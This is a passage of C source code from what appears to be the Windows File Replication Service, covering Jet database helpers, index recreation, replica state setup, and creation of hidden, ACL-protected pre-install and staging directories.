    IN PREPLICA    Replica
    );

ULONG
DbsUpdateConfigTableFields(
    IN PTHREAD_CTX ThreadCtx,
    IN PREPLICA    Replica,
    IN PULONG      RecordFieldx,
    IN ULONG       FieldCount
    );

ULONG
DbsRetireInboundCo(
    IN PTHREAD_CTX ThreadCtx,
    IN PCOMMAND_PACKET CmdPkt
);

ULONG
DbsInjectOutboundCo(
    IN PTHREAD_CTX ThreadCtx,
    IN PCOMMAND_PACKET CmdPkt
);

ULONG
DbsRetryInboundCo(
    IN PTHREAD_CTX ThreadCtx,
    IN PCOMMAND_PACKET CmdPkt
);

ULONG
ChgOrdIssueCleanup(
    PTHREAD_CTX           ThreadCtx,
    PREPLICA              Replica,
    PCHANGE_ORDER_ENTRY   ChangeOrder,
    ULONG                 CleanUpFlags
    );

VOID
ChgOrdRetrySubmit(
    IN PREPLICA  Replica,
    IN PCXTION Cxtion,
    IN USHORT Command,
    IN BOOL   Wait
    );

ULONG
OutLogAddReplica(
    IN PTHREAD_CTX ThreadCtx,
    IN PREPLICA Replica
);


JET_ERR
DbsBuildDirTable(
    IN PTHREAD_CTX   ThreadCtx,
    IN PTABLE_CTX    IDTableCtx,
    IN PTABLE_CTX    DIRTableCtx
    );

JET_ERR
DbsBuildDirTableWorker(
    IN PTHREAD_CTX   ThreadCtx,
    IN PTABLE_CTX    TableCtx,
    IN PVOID         Record,
    IN PVOID         Context
    );

JET_ERR
DbsBuildVVTableWorker(
    IN PTHREAD_CTX   ThreadCtx,
    IN PTABLE_CTX    TableCtx,
    IN PVOID         Record,
    IN PVOID         Context
    );

JET_ERR
DbsBuildCxtionTableWorker(
    IN PTHREAD_CTX   ThreadCtx,
    IN PTABLE_CTX    TableCtx,
    IN PVOID         Record,
    IN PVOID         Context
    );

JET_ERR
DbsInlogScanWorker(
    IN PTHREAD_CTX   ThreadCtx,
    IN PTABLE_CTX    TableCtx,
    IN PVOID         Record,
    IN PVOID         Context
);

ULONG
DbsReplicaHashCalcCoSeqNum (
    PVOID Buf,
    ULONG Length
);

JET_ERR
DbsCreateEmptyDatabase(
    PTHREAD_CTX ThreadCtx,
    PTABLE_CTX TableCtx
    );

ULONG
DbsCreateReplicaTables (
    IN PTHREAD_CTX  ThreadCtx,
    IN PREPLICA     Replica,
    IN PTABLE_CTX   TableCtx
    );

JET_ERR
DbsDeleteReplicaTables (
    IN PTHREAD_CTX  ThreadCtx,
    IN OUT PREPLICA Replica
    );

ULONG
DbsShutdownSingleReplica(
    IN PTHREAD_CTX ThreadCtx,
    IN PREPLICA    Replica
    );

JET_ERR
DbsCreateJetTable (
    IN PTHREAD_CTX   ThreadCtx,
    IN PJET_TABLECREATE   JTableCreate
    );


JET_ERR
DbsWriteReplicaTableRecord(
    IN PTHREAD_CTX   ThreadCtx,
    IN ULONG         ReplicaNumber,
    IN PTABLE_CTX    TableCtx
    );

JET_ERR
DbsUpdateTable(
    IN PTABLE_CTX    TableCtx
    );

JET_ERR
DbsWriteTableRecord(
    IN PTABLE_CTX    TableCtx,
    IN ULONG         JetPrepareUpdateOption
    );

ULONG
DbsFieldDataSize(
    IN PRECORD_FIELDS    FieldInfo,
    IN PJET_SETCOLUMN    JSetColumn,
    IN PJET_COLUMNCREATE JColDesc,
    IN PCHAR             TableName
    );

JET_ERR
DbsOpenConfig(
    IN OUT PTHREAD_CTX    ThreadCtx,
    IN OUT PTABLE_CTX     TableCtx
    );

VOID
DbsFreeRecordStorage(
    IN PTABLE_CTX TableCtx
    );

JET_ERR
DbsReallocateFieldBuffer(
    IN OUT PTABLE_CTX TableCtx,
    IN ULONG FieldIndex,
    IN ULONG NewSize,
    IN BOOL KeepData
    );

VOID
DbsDisplayJetParams(
    IN PJET_SYSTEM_PARAMS Jsp,
    IN ULONG ActualLength
    );

JET_ERR
DbsDumpTable(
    IN PTHREAD_CTX   ThreadCtx,
    IN PTABLE_CTX    TableCtx,
    IN ULONG         RecordIndex
    );

DWORD
FrsReadFileDetails(
    IN     HANDLE                         Handle,
    IN     LPCWSTR                        FileName,
    OUT    PFILE_OBJECTID_BUFFER          ObjectIdBuffer,
    OUT    PLONGLONG                      FileIdBuffer,
    OUT    PFILE_NETWORK_OPEN_INFORMATION FileNetworkOpenInfo,
    IN OUT BOOL                           *ExistingOid
    );

VOID
DbsReplicaSaveStats(
    IN PTHREAD_CTX  ThreadCtx,
    IN PREPLICA     Replica
    );

ULONG
DbsReplicaSaveMark(
    IN PTHREAD_CTX           ThreadCtx,
    IN PREPLICA              Replica,
    IN PVOLUME_MONITOR_ENTRY pVme
    );

BOOL
FrsSetupPrivileges(
    VOID
    );

VOID
DbsOperationTest(
    VOID
    );

VOID
DbsStopReplication (
    IN PREPLICA Replica
    );

PREPLICA
DbsCreateNewReplicaSet(
    VOID
    );

VOID
RcsCheckCxtionSchedule(
    IN PREPLICA Replica,
    IN PCXTION  Cxtion
    );

RcsSetSysvolReady(
    IN DWORD    NewSysvolReady
    );

VOID
RcsCloseReplicaSetmember(
    IN PREPLICA Replica
    );

VOID
RcsCloseReplicaCxtions(
    IN PREPLICA Replica
    );

VOID
RcsDeleteReplicaFromDb(
    IN PREPLICA Replica
    );

ULONG
DbsPrepareRoot(
    IN PREPLICA Replica
    );

DWORD
StuPreInstallRename(
    IN PCHANGE_ORDER_ENTRY  Coe
    );

DWORD
FrsDeleteDirectoryContents(
    IN  PWCHAR  Path,
    IN DWORD    DirectoryFlags
    );

DWORD
FrsGetFileInternalInfoByHandle(
    IN HANDLE Handle,
    OUT PFILE_INTERNAL_INFORMATION  InternalFileInfo
    );

VOID
FrsCreateJoinGuid(
    OUT GUID *OutGuid
    );
//
// Journal defined functions only we call.
//

DWORD
WINAPI
Monitor(
    LPVOID ThreadContext
    );

ULONG
JrnlPauseVolume(
    IN PVOLUME_MONITOR_ENTRY pVme,
    IN DWORD                 MilliSeconds
    );

ULONG
JrnlUnPauseVolume(
    IN PVOLUME_MONITOR_ENTRY pVme,
    IN PJBUFFER              Jbuff,
    IN BOOL                  HaveLock
    );

ULONG
JrnlCleanOutReplicaSet(
    PREPLICA Replica
    );

ULONG
JrnlPrepareService2(
    IN PTHREAD_CTX   ThreadCtx,
    IN PREPLICA Replica
    );

ULONG
JrnlShutdownSingleReplica(
    IN PREPLICA Replica,
    IN BOOL HaveLock
    );

ULONG
DbsUnPackSchedule(
    IN PSCHEDULE    *Schedule,
    IN ULONG        Fieldx,
    IN PTABLE_CTX   TableCtx
    );

ULONG
JrnlAddFilterEntryFromCo(
    IN PREPLICA Replica,
    IN PCHANGE_ORDER_ENTRY  ChangeOrder,
    OUT PFILTER_TABLE_ENTRY  *RetFilterEntry
    );

BOOL
JrnlDoesChangeOrderHaveChildren(
    IN  PTHREAD_CTX          ThreadCtx,
    IN  PTABLE_CTX           TmpIDTableCtx,
    IN  PCHANGE_ORDER_ENTRY  ChangeOrder
    );

DWORD
StuDelete(
    IN PCHANGE_ORDER_ENTRY  Coe
    );

DWORD
StageAddStagingArea(
    IN PWCHAR   StageArea
    );

VOID
InfoPrint(
    IN PNTFRSAPI_INFO  Info,
    IN PCHAR  Format,
    IN ... );

VOID
DbsDisplaySchedule(
    IN ULONG        Severity,
    IN PCHAR        Debsub,
    IN ULONG        LineNo,
    IN PWCHAR       Header,
    IN PSCHEDULE    Schedule
    );

#define DBS_DISPLAY_SCHEDULE(_Severity, _Header, _Schedule) \
        DbsDisplaySchedule(_Severity, DEBSUB, __LINE__, _Header, _Schedule);

VOID
RcsCreatePerfmonCxtionName(
    PREPLICA  Replica,
    PCXTION   Cxtion
    );


ULONG
DbsReplicaNameConflictHashCalc (
    PVOID Buf,
    ULONG Length
)
/*++

Routine Description:

    Calculate a hash value on a name conflict key.  It is expected that the
    caller has already taken the parent file guid and the file name and
    produced a 64 bit key value.  This function just reduces it to 32 bits.

Arguments:

    Buf -- ptr to a name conflict key.
    Length -- should be 8 bytes.

Return Value:

    32 bit hash value.

--*/
{
#undef DEBSUB
#define DEBSUB  "DbsReplicaNameConflictHashCalc:"

    ULONG Value, HighPart, LowPart;

    if (!ValueIsMultOf4(Buf)) {
        DPRINT3(0, "++ ERROR - Unaligned key value - addr: %08x, len: %d, Data: %08x\n",
                Buf, Length, *(PULONG)Buf);
        FRS_ASSERT(ValueIsMultOf4(Buf));
        return 0xFFFFFFFF;
    }

    if (Length != sizeof(LONGLONG)) {
        DPRINT1(0, "++ ERROR - Invalid Length: %d\n", Length);
        FRS_ASSERT(Length == sizeof(LONGLONG));
        return 0xFFFFFFFF;
    }

    LowPart  = *(PULONG) Buf;
    HighPart = *(PULONG)( (PCHAR) Buf + 4 );

    //
    // Sequence numbers are 4 bytes but will be 8 bytes later.
    //
    Value = LowPart + HighPart;

    return Value;

}



ULONG
DbsReplicaHashCalcCoSeqNum (
    PVOID Buf,
    ULONG Length
)
/*++

Routine Description:

    Calculate a hash value on a change order sequence number.

Arguments:

    Buf -- ptr to a file ID.
    Length -- should be 4 bytes.  (upgrade to QW seq num)

Return Value:

    32 bit hash value.

--*/
{
#undef DEBSUB
#define DEBSUB  "DbsReplicaHashCalcCoSeqNum:"

    ULONG Value, HighPart, LowPart;

    if (!ValueIsMultOf4(Buf)) {
        DPRINT3(0, "++ ERROR - Unaligned key value - addr: %08x, len: %d, Data: %08x\n",
                Buf, Length, *(PULONG)Buf);
        FRS_ASSERT(ValueIsMultOf4(Buf));
        return 0xFFFFFFFF;
    }

    if (Length != sizeof(LONGLONG)) {
        DPRINT1(0, "++ ERROR - Invalid Length: %d\n", Length);
        FRS_ASSERT(Length == sizeof(LONGLONG));
        return 0xFFFFFFFF;
    }

    LowPart  = *(PULONG) Buf;
    HighPart = *(PULONG)( (PCHAR) Buf + 4 );

    //
    // Sequence numbers are 4 bytes but will be 8 bytes later.
    //
    Value = LowPart + HighPart;

    return Value;

}



JET_ERR
DbsCompact(
    IN JET_INSTANCE JInstance,
    IN JET_SESID    Sesid
    )
/*++

Routine Description:

    Compact the jet database.

    This has the sideeffect of clearing up -1414 jet errors
    (corrupted secondary indexes). -1414 errors are usually the
    result of upgrading a computer. -1414 errors are returned
    after upgrade because the collating sequences might have
    changed so the jet runtime requires callers to rebuild indexes.

    This function is currently unused for the above purpose because
    NtFrs cannot attach the database because of a jet error regarding
    FixedDDL tables (jerr == -1323). Instead, an event describes a
    manual recovery process.

    This function is unused for another reason; there is no
    infrastructure for compacting the database on demand.
    I am leaving the code as a starting point for later.

Arguments:

    JInstance    - from JetInit()
    Sesid       - from JetBeginSession()

Return Value:

    Jet status code.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsCompact:"
    DWORD       WStatus;
    JET_ERR     jerr, jerr1;
    BOOL        DetachNeeded = FALSE;

    //
    // Attach read only
    //
    DPRINT2(4, "Compacting database %s into %s\n", JetFileA, JetFileCompactA);
    jerr = JetAttachDatabase(Sesid, JetFileA, JET_bitDbReadOnly);
    CLEANUP_JS(0, "ERROR - JetAttach for Compact error:", jerr, CLEANUP);

    DetachNeeded = TRUE;
    //
    // Compact
    //
    jerr = JetCompact(Sesid, JetFileA, JetFileCompactA, NULL, NULL, 0);
    CLEANUP_JS(0, "ERROR - JetCompact error:", jerr, CLEANUP);

    //
    // Rename compacted file
    //
    DPRINT2(4, "Done compacting database %s into %s\n", JetFileA, JetFileCompactA);
    if (!MoveFileEx(JetFileCompact,
                    JetFile,
                    MOVEFILE_REPLACE_EXISTING |
                    MOVEFILE_WRITE_THROUGH)) {
        WStatus = GetLastError();
        DPRINT2_WS(0, "ERROR - Cannot rename compacted jet file %s to %s;",
                   JetFileA, JetFileCompactA, WStatus);
        jerr = JET_errDatabaseInUse;
        goto CLEANUP;
    }
    //
    // DONE
    //
    DPRINT1(0, "Successfully Compacted %s\n", JetFileA);
    jerr = JET_errSuccess;

CLEANUP:
    if (DetachNeeded) {
        jerr1 = JetDetachDatabase(Sesid, JetFileA);
        if (JET_SUCCESS(jerr)) {
            jerr = jerr1;
        }
    }

    DPRINT_JS(0, "++ Error in compacting :", jerr);

    return jerr;
}


JET_ERR
DbsRecreateIndexes(
    IN PTHREAD_CTX    ThreadCtx,
    IN PTABLE_CTX     TableCtx
    )
/*++

Routine Description:

    This function opens recreates any missing indexes for the TableCtx.

Arguments:

    ThreadCtx   - The thread context.  The Jet instance, session id and DB ID
                  are returned here.

    TableCtx    - Table context for the Config table.

Return Value:

    Jet status code.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsRecreateIndexes:"

    JET_ERR             jerr, jerr1;
    ULONG               i;
    JET_TABLEID         Tid = JET_tableidNil;
    JET_TABLEID         FrsOpenTableSaveTid = JET_tableidNil;
    PJET_TABLECREATE    JTableCreate;
    PJET_INDEXCREATE    JIndexDesc;
    CHAR                TableName[JET_cbNameMost];

    //
    // Disable until jet can handle FixedDDL tables.
    //
    return JET_errSuccess;

    //
    // Recreate any deleted indexes.
    //
    // An index may get deleted during the call to JetAttachDatabase()
    // when the JET_bitDbDeleteCoruptIndexes grbit is set. Jet
    // normally marks indexes as corrupt when the build number
    // changes because jet has no way of knowing if the collating
    // sequence in the current build is different than those in
    // other builds.
    //
    jerr = DBS_OPEN_TABLE(ThreadCtx,
                          TableCtx,
                          TableCtx->ReplicaNumber,
                          TableName,
                          &Tid);
    CLEANUP1_JS(0, "++ ERROR - FrsOpenTable (%s):", TableName, jerr, CLEANUP);

    //
    // For each index
    //
    JTableCreate    = TableCtx->pJetTableCreate;
    JIndexDesc      = JTableCreate->rgindexcreate;
    for (i = 0; i < JTableCreate->cIndexes; ++i) {
        //
        // Set the current index.
        //
        jerr = JetSetCurrentIndex(TableCtx->Sesid,
                                  TableCtx->Tid,
                                  JIndexDesc[i].szIndexName);
        if (JET_SUCCESS(jerr)) {
            DPRINT2(4, "++ Index (%s\\%s) has not been deleted; skipping\n",
                    TableName, JIndexDesc[i].szIndexName);
            continue;
        }

        if (jerr != JET_errIndexNotFound) {
            CLEANUP2_JS(0, "++ ERROR - JetSetCurrentIndex (%s\\%s) :",
                        TableName, JIndexDesc[i].szIndexName, jerr, CLEANUP);
        }

        //
        // Recreate the missing index
        //
        jerr = JetCreateIndex(TableCtx->Sesid,
                              TableCtx->Tid,
                              JIndexDesc[i].szIndexName,
                              JIndexDesc[i].grbit,
                              JIndexDesc[i].szKey,
                              JIndexDesc[i].cbKey,
                              JIndexDesc[i].ulDensity);
        CLEANUP2_JS(0, "++ ERROR - JetCreateIndex (%s\\%s) :",
                    TableName, JIndexDesc[i].szIndexName, jerr, CLEANUP);

        DPRINT2(0, "++ WARN - Recreated index %s\\%s\n",
                TableName, JIndexDesc[i].szIndexName);
    }

CLEANUP:
    //
    // Jet error message
    //
    DPRINT_JS(0, "++ RecreateIndexes failed:", jerr);

    //
    // Close the table iff it was opened in this function
    //
    if (Tid != JET_tableidNil && FrsOpenTableSaveTid == JET_tableidNil) {
        DbsCloseTable(jerr1, TableCtx->Sesid, TableCtx);
        DPRINT1_JS(0, "++ DbsCloseTable (%s):", TableName, jerr1);
        jerr = JET_SUCCESS(jerr) ? jerr1 : jerr;
    }

    //
    // Done
    //
    return jerr;
}

JET_ERR
DbsRecreateIndexesForReplica(
    IN PTHREAD_CTX  ThreadCtx,
    IN DWORD        ReplicaNumber
    )
/*++

Routine Description:

    This function recreates any indexes that may have been deleted
    because they were corrupt at the call to JetAttachDatabase().

    Called once when the config records are enumerated.

Arguments:

    ThreadCtx   - The thread context, provides session ID and database ID.

    ReplicaNumber   - Local id for this replica.

Return Value:

    Status code.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsRecreateIndexesForReplica:"
    ULONG               i;
    JET_ERR             jerr;
    ULONG               FStatus = FrsErrorSuccess;
    PTABLE_CTX          TableCtx;
    PREPLICA_THREAD_CTX RtCtx = NULL;

    //
    // Disable until jet can handle FixedDDL tables.
    //
    return JET_errSuccess;

    //
    // Alloc a Replica Thread Context.
    //
    // Note: The opened tables in a Replica Thread Context can only be
    // used by the thread that performed the open.
    //
    RtCtx = FrsAllocType(REPLICA_THREAD_TYPE);

    //
    // Get the base of the array of TableCtx structs from the replica thread
    // context struct and the base of the table create structs.
    //
    TableCtx = RtCtx->RtCtxTables;

    //
    // Recreate the indexes (if any)
    //
    for (i = 0; i < TABLE_TYPE_MAX; ++i, ++TableCtx) {
        TableCtx->pJetTableCreate = &DBTables[i];
        TableCtx->ReplicaNumber = ReplicaNumber;
        jerr = DbsRecreateIndexes(ThreadCtx, TableCtx);
        CLEANUP1_JS(0, "++ ERROR - DbsRecreateIndex (ReplicaNumber %d):",
                    ReplicaNumber, jerr, ERROR_RETURN);
    }

    FrsFreeType(RtCtx);
    return FStatus;

ERROR_RETURN:
    FrsFreeType(RtCtx);
    return DbsTranslateJetError(jerr, FALSE);
}



JET_ERR
DbsSetupReplicaStateWorker(
    IN PTHREAD_CTX   ThreadCtx,
    IN PTABLE_CTX    TableCtx,
    IN PVOID         Record,
    IN PVOID         Context
)
/*++

Routine Description:

    This is a worker function passed to FrsEnumerateTable().  Each time
    it is called It initializes another Replica set.

Arguments:

    ThreadCtx - Needed to access Jet.
    TableCtx - A ptr to a ConfigTable context struct.
    Record - A ptr to a Config table record.
    Context - Not Used.

Thread Return Value:

    A Jet error status.  Success means call us with the next record.
    Failure means don't call again and pass our status back to the
    caller of FrsEnumerateTable().  We always return JET_errSuccess
    to keep trying to get through all the config table records.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsSetupReplicaStateWorker:"


    PCONFIG_TABLE_RECORD ConfigRecordArg = (PCONFIG_TABLE_RECORD) Record;

    PREPLICA Replica;

    JET_ERR jerr, jerr1;
    ULONG FStatus;


    DPRINT1(4, "<<<<<<<...E N T E R I N G -- %s...>>>>>>>>\n", DEBSUB);

    DBS_DISPLAY_RECORD_SEV(4, TableCtx, TRUE);

    //
    // Skip the system  record.
    //
    if ((ConfigRecordArg->ReplicaNumber == FRS_SYSTEM_INIT_REPLICA_NUMBER) ||
        WSTR_EQ(ConfigRecordArg->ReplicaSetName, NTFRS_RECORD_0)           ||
        WSTR_EQ(ConfigRecordArg->FSRootPath, FRS_SYSTEM_INIT_PATH)         ||
        WSTR_EQ(ConfigRecordArg->ReplicaSetName, FRS_SYSTEM_INIT_RECORD) ) {
        return JET_errSuccess;
    }

    //
    // Track the maximum local replica ID assigned.
    //
    if (ConfigRecordArg->ReplicaNumber >= FrsMaxReplicaNumberUsed) {
        FrsMaxReplicaNumberUsed = ConfigRecordArg->ReplicaNumber + 1;
    }

    //
    // Allocate a replica struct and init the replica number.
    //
    Replica = FrsAllocType(REPLICA_TYPE);
    Replica->ReplicaNumber = ConfigRecordArg->ReplicaNumber;

    //
    // Recreate the indexes that may have been deleted during
    // the call to JetAttachDatabase().
    //
    FStatus = DbsRecreateIndexesForReplica(ThreadCtx, Replica->ReplicaNumber);
    if (FRS_SUCCESS(FStatus)) {
        //
        // Init the replica struct and open the replica tables.
        //
        FStatus = DbsOpenReplicaSet(ThreadCtx, Replica);
    }
    Replica->FStatus = FStatus;

    //
    // Add the replica struct to the global Replica list or the fault list.
    //
    if (FRS_SUCCESS(FStatus)) {
        JrnlSetReplicaState(Replica, REPLICA_STATE_INITIALIZING);
    } else {
        JrnlSetReplicaState(Replica, REPLICA_STATE_ERROR);
    }
    //
    // Always return success so enumeration continues.
    //
    return JET_errSuccess;

}




ULONG
DbsCreatePreInstallDir(
    IN PREPLICA Replica
    )
/*++
Routine Description:

    Create the preinstall directory for Replica.  Leave the handle open so
    it can't be deleted.  Save the handle and the FID of the pre-install
    dir in the Replica struct.  The later is used for journal filtering.
    Set an ACL on the pre-install dir to prevent access except to admin.

    Make the pre-install dir Readonly, system, and hidden
    Making it system and hidden makes it "super-hidden" which means the
    shell will never show it unless you specify the complete path.

    The startup of this replica set fails if we can't create create/open
    the pre-install dir.

Arguments:

    Replica -- ptr to a REPLICA struct

Return Value:

    Win 32 status.
    Replica->FStatus is set with an FRS status code for the caller to examine.

--*/
{
#undef DEBSUB
#define DEBSUB  "DbsCreatePreInstallDir:"

    FILE_INTERNAL_INFORMATION  FileInternalInfo;

    ULONG   WStatus;
    ULONG   FileAttributes;
    PWCHAR  PreInstallPath = NULL;
    BOOL    NewlyCreated = FALSE;

    REPLICA_STATE_TRACE(3, NULL, Replica, 0, "F, DbsCreatePreInstallDir entry");

    //
    // Don't recreate
    //
    if (HANDLE_IS_VALID(Replica->PreInstallHandle)) {
        REPLICA_STATE_TRACE(3, NULL, Replica, 0, "F, Create Preinstall: handle valid");
        return ERROR_SUCCESS;
    }

    //
    // Don't hold open for deleted replicas
    //
    if (!IS_TIME_ZERO(Replica->MembershipExpires)) {
        REPLICA_STATE_TRACE(3, NULL, Replica, 0, "F,  DbsCreatePreInstallDir skipped, replica marked deleted.");
        return ERROR_SUCCESS;
    }


    //
    // Does the replica root volume exist and does it support ACLs?
    // ACLs are required to protect against data theft/corruption
    // in the pre-install dir.
    //
    WStatus = FrsVerifyVolume(Replica->Root,
                              Replica->SetName->Name,
                              FILE_PERSISTENT_ACLS);
    if (!WIN_SUCCESS(WStatus)) {
        DPRINT2_WS(3, ":S: Replica tree root Volume (%ws) for %ws does not exist or does not support ACLs;",
                   Replica->Root, Replica->SetName->Name, WStatus);
        Replica->FStatus = FrsErrorStageDirOpenFail;
        return WStatus;
    }

    //
    // Open the preinstall directory and hold it open until the
    // replica is closed. Create if necessary. The attributes for
    // the preinstall directory are system, hidden, and readonly.
    //
    PreInstallPath = FrsWcsPath(Replica->Root, NTFRS_PREINSTALL_DIRECTORY);

    if (!CreateDirectory(PreInstallPath, NULL)) {
        WStatus = GetLastError();
        if (!WIN_SUCCESS(WStatus) && !WIN_ALREADY_EXISTS(WStatus)) {

            if (WIN_ACCESS_DENIED(WStatus) ||
                WIN_NOT_FOUND(WStatus)     ||
                WIN_BAD_PATH(WStatus)) {
                EPRINT3(EVENT_FRS_CANT_OPEN_PREINSTALL,
                        Replica->SetName->Name,
                        PreInstallPath,
                        Replica->Root);
            }

            DPRINT1_WS(0, ":S: ERROR - Can't create preinstall dir %ws;",
                       PreInstallPath, GetLastError());

            Replica->FStatus = FrsErrorPreinstallCreFail;
            goto CLEANUP;
        }

    } else {
        NewlyCreated = TRUE;
    }

    //
    // Disable readonly for just a bit; just long enough to open for write
    //
    if (!SetFileAttributes(PreInstallPath, FILE_ATTRIBUTE_SYSTEM |
                                           FILE_ATTRIBUTE_HIDDEN)) {
        WStatus = GetLastError();
        DPRINT1_WS(0, ":S: ERROR - Can't reset attrs on preinstall dir %ws;",
                PreInstallPath, WStatus);

        Replica->FStatus = FrsErrorPreinstallCreFail;
        goto CLEANUP;
    }
    //
    // Hold open forever; preinstall files go here
    //
    Replica->PreInstallHandle = CreateFile(
        PreInstallPath,
        GENERIC_WRITE | WRITE_DAC | FILE_READ_ATTRIBUTES | FILE_TRAVERSE,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS,
        NULL);

    if (!HANDLE_IS_VALID(Replica->PreInstallHandle)) {
        WStatus = GetLastError();
        DPRINT1_WS(0, ":S: ERROR - Can't open preinstall dir %ws;", PreInstallPath, WStatus);

        Replica->FStatus = FrsErrorPreinstallCreFail;
        goto CLEANUP;
    }


    //
    // Get the fid of preinstall area for filtering.
    //
    WStatus = FrsGetFileInternalInfoByHandle(Replica->PreInstallHandle,
                                             &FileInternalInfo);
    if (!WIN_SUCCESS(WStatus)) {
        DPRINT1_WS(0, ":S: ERROR - FrsGetFileInternalInfoByHandle(%ws);", PreInstallPath, WStatus);
        FRS_CLOSE(Replica->PreInstallHandle);
        goto CLEANUP;
    }

    Replica->PreInstallFid = FileInternalInfo.IndexNumber.QuadPart;

    DPRINT1(3, ":S: Preinstall FID:  %08x %08x\n", PRINTQUAD(Replica->PreInstallFid));

    //
    // The following errors are not fatal.
    //

    // Restrict access if the directory was just created. We need to do that
    // to avoid journal wrap caused by recursice ACL stamping on the
    // preinstall directory. Look at how SetSecurityInfo works.
    // Put an ACL on the staging dir to keep it from getting deleted and
    // to keep users from snooping the contents. Do not inherit ACLs
    // from the parent dir.
    //
    if (NewlyCreated == TRUE) {
        WStatus = FrsRestrictAccessToFileOrDirectory(PreInstallPath,
                                                     Replica->PreInstallHandle,
                                                     FALSE, // do not inherit acls from parent.
                                                     FALSE);// do not push acls to children.
        DPRINT1_WS(0, ":S: WARN - FrsRestrictAccessToFileOrDirectory(%ws) (IGNORED);", PreInstallPath, WStatus);
        //
        // A failure here does not break us.
        //
        WStatus = ERROR_SUCCESS;
    }

    //
    // Make the pre-install dir Readonly, system, and hidden
    // Note: marking a dir or file as system and hidden makes it "super-hidden"
    // which means the shell will never show it unless you specify the
    // complete path.
    //
    if (!SetFileAttributes(PreInstallPath, FILE_ATTRIBUTE_READONLY |
                                           FILE_ATTRIBUTE_SYSTEM |
                                           FILE_ATTRIBUTE_HIDDEN)) {
        DPRINT1_WS(0, ":S: ERROR - Can't set attrs on preinstall dir %ws;",
                PreInstallPath, GetLastError());
        FRS_CLOSE(Replica->PreInstallHandle);
        Replica->PreInstallFid = ZERO_FID;
        goto CLEANUP;
    }

    REPLICA_STATE_TRACE(3, NULL, Replica, 0, "F,  Create Preinstall: success");


CLEANUP:

    FrsFree(PreInstallPath);

    return WStatus;
}



ULONG
DbsOpenStagingDir(
    IN PREPLICA Replica
    )
/*++
Routine Description:

    Open the staging dir and mark it hidden.  We don't set it supper hidden
    since the user must create it for us and they may use it for multiple
    replica sets so we don't want to make it too hard for them to find.
    Set an ACL on the staging dir to prevent access except to admin.

    The startup of this replica set fails if we don't find the staging area.

Arguments:

    Replica -- ptr to a REPLICA struct

Return Value:

    Win 32 status.
    Replica->FStatus is set with an FRS status code for the caller to examine.

--*/
{
#undef DEBSUB
#define DEBSUB  "DbsOpenStagingDir:"

    FILE_INTERNAL_INFORMATION  FileInternalInfo;

    ULONG   WStatus;
    DWORD   FileAttributes;
    HANDLE  StageHandle = INVALID_HANDLE_VALUE;

    REPLICA_STATE_TRACE(3, NULL, Replica, 0, "F, DbsOpenStagingDir entry");

    //
    // Don't check for valid staging dir if this replica set has been marked deleted.
    //
    if (!IS_TIME_ZERO(Replica->MembershipExpires)) {
        REPLICA_STATE_TRACE(3, NULL, Replica, 0, "F,  DbsOpenStagingDir skipped, replica marked deleted.");
        return ERROR_SUCCESS;
    }

    //
    // Stage does not exist or is inaccessable; continue
    //
    WStatus = FrsDoesDirectoryExist(Replica->Stage, &FileAttributes);
    if (!WIN_SUCCESS(WStatus)) {
        DPRINT2_WS(3, ":S: Stage path (%ws) for %ws does not exist;",
                   Replica->Stage, Replica->SetName->Name, WStatus);
        EPRINT2(EVENT_FRS_STAGE_NOT_VALID, Replica->Root, Replica->Stage);
        return WStatus;
    }

    //
    // Does the staging volume exist and does it support ACLs?
    // ACLs are required to protect against data theft/corruption
    // in the staging dir.
    //
    WStatus = FrsVerifyVolume(Replica->Stage,
                              Replica->SetName->Name,
                              FILE_PERSISTENT_ACLS);
    if (!WIN_SUCCESS(WStatus)) {
        DPRINT2_WS(3, ":S: Stage path Volume (%ws) for %ws does not exist or does not support ACLs;",
                   Replica->Stage, Replica->SetName->Name, WStatus);
        Replica->FStatus = FrsErrorStageDirOpenFail;
        return WStatus;
    }

    //
    // Open the staging directory.  This must be supplied by the user.
    // It would be hazardous for us to create this just anywhere.
    //
    StageHandle = CreateFile(Replica->Stage,
                             GENERIC_WRITE | WRITE_DAC | FILE_READ_ATTRIBUTES | FILE_TRAVERSE,
                             FILE_SHARE_READ,
                             NULL,
                             OPEN_EXISTING,
                             FILE_FLAG_BACKUP_SEMANTICS,
                             NULL);

    if (!HANDLE_IS_VALID(StageHandle)) {
        WStatus = GetLastError();
        DPRINT1_WS(0, ":S: WARN - CreateFile(%ws);", Replica->Stage, WStatus);
        //
        // If we can't find the staging dir then put out event log message.
        // Either way we can't start up this replica set.
        //
        Replica->FStatus = FrsErrorStageDirOpenFail;

        if (WIN_ACCESS_DENIED(WStatus) ||
            WIN_NOT_FOUND(WStatus)     ||
            WIN_BAD_PATH(WStatus)) {
            EPRINT3(EVENT_FRS_CANT_OPEN_STAGE,
                    Replica->SetName->Name,
                    Replica->Stage,
                    Replica->Root);
        }

        return WStatus;
    }


    if (FileAttributes == 0xFFFFFFFF) {
        WStatus = GetLastError();
        DPRINT1_WS(0, ":S: ERROR - GetFileAttributes(%ws);", Replica->Stage, WStatus);
        WStatus = ERROR_BAD_PATHNAME;
        Replica->FStatus = FrsErrorStageDirOpenFail;
        goto CLEANUP;
    }

    //
    // It must be a dir.
    //
    if (!BooleanFlagOn(FileAttributes, FILE_ATTRIBUTE_DIRECTORY)) {
        DPRINT1(0, ":S: ERROR - Stage path (%ws) is not an directory\n", Replica->Stage);
        WStatus = ERROR_BAD_PATHNAME;
        EPRINT3(EVENT_FRS_CANT_OPEN_STAGE,
                Replica->SetName->Name,
                Replica->Stage,
                Replica->Root);
        Replica->FStatus = FrsErrorStageDirOpenFail;
        goto CLEANUP;
    }

    //
    // No errors past this point since this won't really stop replication.
    //

    //
    // Mark the staging dir hidden.
    //
    if (!BooleanFlagOn(FileAttributes, FILE_ATTRIBUTE_HIDDEN)) {
        if (!SetFileAttributes(Replica->Stage,
                               FileAttributes | FILE_ATTRIBUTE_HIDDEN)) {
            WStatus = GetLastError();
            DPRINT1_WS(0, ":S: ERROR - Can't set attrs on staging dir %ws;", Replica->Stage, WStatus);
            WStatus = ERROR_SUCCESS;
        }
    }

    //
    // Put an ACL on the staging dir to keep it from getting deleted and
    // to keep users from snooping the contents. Do not inherit ACLs
    // from the parent dir.
    //
    WStatus = FrsRestrictAccessToFileOrDirectory(Replica->Stage, StageHandle,
                                                 FALSE, // do not inherit acls from parent.
